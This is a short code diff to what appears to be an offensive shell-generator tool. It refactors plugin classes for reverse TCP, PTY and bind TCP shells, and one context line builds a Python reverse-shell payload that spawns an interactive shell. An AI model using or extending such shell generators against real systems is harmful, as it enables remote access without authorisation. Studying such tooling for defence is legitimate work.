@@ -48,7 +48,7 @@ class ReverseTCP(plugin.ReverseShell):
             self.shell += f"""p=subprocess.call(["{self.args.shell}","-i"]);'"""
 
 
-class PTY(plugin.Module):
+class PTY(plugin.BaseShell):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -114,7 +114,9 @@ class BindTCP(plugin.BindShell):
         self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
         self.set_write_file()
-        self.shell_type = "tcp"
+        self.protocol = "tcp"
+        self.shell_type = 0
+        self.is_interactive = True
 
     def make_shell(self):
         if self.args.exec == "pty":
